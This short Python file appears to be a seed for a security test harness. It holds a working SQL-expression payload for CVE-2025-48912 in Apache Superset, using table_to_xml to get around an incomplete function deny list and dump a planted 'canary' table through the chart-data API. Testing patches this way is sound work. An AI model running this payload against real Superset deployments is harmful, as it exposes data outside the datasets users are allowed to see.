#!/usr/bin/env python3
"""[GIVEN] CVE-2025-48912 seed exploit -- PostgreSQL XML function not on deny list.

Apache Superset's chart-data API validates adhoc SQL expressions against a
deny list of dangerous PostgreSQL functions (DISALLOWED_SQL_FUNCTIONS).
In versions before 4.1.2, the deny list was incomplete -- it blocked
query_to_xml but NOT table_to_xml, database_to_xml, or
query_to_xml_and_xmlschema. These functions read SQL results as XML,
invisible to the subquery parser, enabling data exfiltration from tables
outside the declared dataset.

The payload uses table_to_xml('canary', ...) via sqlExpression in the
/api/v1/chart/data endpoint. The canary table (planted flag) is dumped as
XML and returned in the query result.

Contract: reads canary on V0 (4.0.2); BLOCKED on V1 (4.1.2, deny list expanded).
"""
from __future__ import annotations

# table_to_xml(tbl, nulls, tableforest, targetns) -> xml
# Not on the 4.0.2 DISALLOWED_SQL_FUNCTIONS deny list.
# Added to the deny list in 4.1.0/4.1.2.
PAYLOAD = "CAST(table_to_xml('canary', true, false, '') AS TEXT)"


def candidate() -> dict:
    """The request candidate for this seed."""
    return {
        "probe_id": "cve-2025-48912-table-to-xml",
        "payload": PAYLOAD,
    }


if __name__ == "__main__":
    print(f"sqlExpression payload: {PAYLOAD}")
